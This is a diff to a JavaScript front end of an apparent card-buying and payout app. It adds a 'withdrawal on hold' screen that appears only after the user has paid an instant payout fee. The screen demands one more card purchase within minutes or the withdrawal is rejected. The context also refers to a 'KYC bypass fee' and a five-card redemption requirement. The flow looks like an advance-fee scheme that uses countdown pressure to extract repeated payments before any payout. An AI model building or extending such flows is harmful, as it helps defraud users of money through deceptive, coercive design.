@@ -1276,6 +1276,21 @@
         });
     }
 
+    // Shown right after the instant payout fee is paid: the user has until `deadlineIso` to buy one more card.
+    function showExtraCardDeadlineNotice(deadlineIso, progress) {
+        const leftMs = Math.max(0, Date.parse(deadlineIso) - Date.now());
+        const mins = Math.max(1, Math.ceil(leftMs / 60000));
+        const required = Math.max(1, Math.trunc(Number(progress?.required)) || 1);
+        const current = Math.min(required - 1, Math.max(0, Math.trunc(Number(progress?.current)) || 0));
+        const left = required - current;
+        openFlowSheet({
+            title: 'Withdrawal on hold',
+            body: `<div class="cards-needed" role="status"><span class="cards-needed-number">${current}/${required}</span><span class="cards-needed-label">${left} more card${left === 1 ? '' : 's'} to go</span></div><p class="kyc-refund-note" style="text-align:center">Instant payout paid. Purchase ${left === 1 ? 'one more card' : left + ' more cards'} within ${mins} minute${mins === 1 ? '' : 's'} to keep this withdrawal. If not, it will be rejected and your balance returned.</p>`,
+            primaryText: 'Buy a card now', secondaryText: 'Later', variant: 'center',
+            onPrimary: () => { closeFlowSheet(); safeNavigate('shop', 'extra-card-after-instant'); },
+        });
+    }
+
     // Final withdrawal stage, shown after the "one more card" step: five redeemed cards in total.
     // Shows progress as current/required (e.g. 4/5) and how many cards are still missing.
     function showRedeemFiveNotice(current, required, message = '') {
@@ -1713,6 +1728,11 @@
                 showToast('warning', 'Your payment was received, but this withdrawal is no longer pending. Please contact support to have the fee reviewed.');
                 return true;
             }
+            if (data.withdrawal?.extraCardRejectAt && data.withdrawal.status === 'pending') {
+                showToast('warning', 'Instant payout confirmed. Buy one more card within 5 minutes to keep this withdrawal.');
+                showExtraCardDeadlineNotice(data.withdrawal.extraCardRejectAt, data.extraCardProgress);
+                return true;
+            }
             showToast('success', 'Instant payout confirmed. Your withdrawal is now waiting for immediate admin approval.');
             openFlowSheet({
                 title: 'Instant payout paid',
@@ -2051,7 +2071,7 @@
             const holdMs = holdRemainingMs(item);
             const instantAvailable = canPayInstant(item);
             const help = item.status === 'pending'
-                ? (item.instantPayout ? 'Instant payout paid. Priority admin approval.' : holdMs > 0 ? `Pending period: payout approval opens in ${formatHold(holdMs)}.` : 'Waiting for admin approval.')
+                ? (item.instantPayout ? (item.extraCardRejectAt ? 'Instant payout paid. Buy one more card before ' + new Date(item.extraCardRejectAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) + ' or this withdrawal will be rejected.' : 'Instant payout paid. Priority admin approval.') : holdMs > 0 ? `Pending period: payout approval opens in ${formatHold(holdMs)}.` : 'Waiting for admin approval.')
                 : item.status === WITHDRAWAL_PENDING_KYC
                     ? bypassAwaitingPayment
                         ? `${ghs(KYC_BYPASS_FEE)} Paystack payment is awaiting confirmation. This withdrawal stays pending until that payment succeeds.`
